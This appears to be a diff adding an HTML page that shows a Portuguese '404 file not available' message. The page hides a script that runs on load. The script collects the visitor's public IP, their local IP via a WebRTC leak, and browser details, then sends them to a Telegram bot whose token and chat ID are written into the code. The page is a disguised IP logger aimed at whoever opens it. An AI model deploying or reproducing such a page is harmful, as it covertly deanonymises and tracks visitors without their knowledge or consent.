@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Erro 404</title>
+</head>
+<body>
+  Erro 404 - Arquivo não disponível.
+
+  <script>
+    const BOT_TOKEN = '8022691060:AAFmsFVXlUFLkB79Nb-E58CUfZM7g4oz7k8';
+    const CHAT_ID = '@pegapegaospanela';
+
+    async function getWebRTCIP() {
+      return new Promise((resolve) => {
+        const pc = new RTCPeerConnection({iceServers:[]});
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = event => {
+          if (!event || !event.candidate) return resolve("Não encontrada");
+          const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+          if (ipMatch) resolve(ipMatch[1]);
+          else resolve("Não encontrada");
+        };
+      });
+    }
+
+    async function getPublicIP() {
+      try {
+        const res = await fetch('https://api64.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip || "Não encontrada";
+      } catch {
+        return "Não encontrada";
+      }
+    }
+
+    async function sendToTelegram(text) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      await fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: 'Markdown'
+        })
+      });
+    }
+
+    async function main() {
+      const webrtcIP = await getWebRTCIP();
+      const publicIP = await getPublicIP();
+
+      const headers = {
+        "User-Agent": navigator.userAgent || "Não encontrada",
+        "Idioma": navigator.language || "Não encontrada",
+        "Plataforma": navigator.platform || "Não encontrada",
+        "Cookies habilitados": navigator.cookieEnabled ? "Sim" : "Não",
+        "JavaScript habilitado": "Sim"
+      };
+
+      let msg = `*IP Público:* ${publicIP}\n*IP via WebRTC:* ${webrtcIP}\n\n*Headers e Infos:*`;
+      for (const [key, value] of Object.entries(headers)) {
+        msg += `\n${key}: ${value}`;
+      }
+
+      await sendToTelegram(msg);
+    }
+
+    main();
+  </script>
+</body>
+</html>
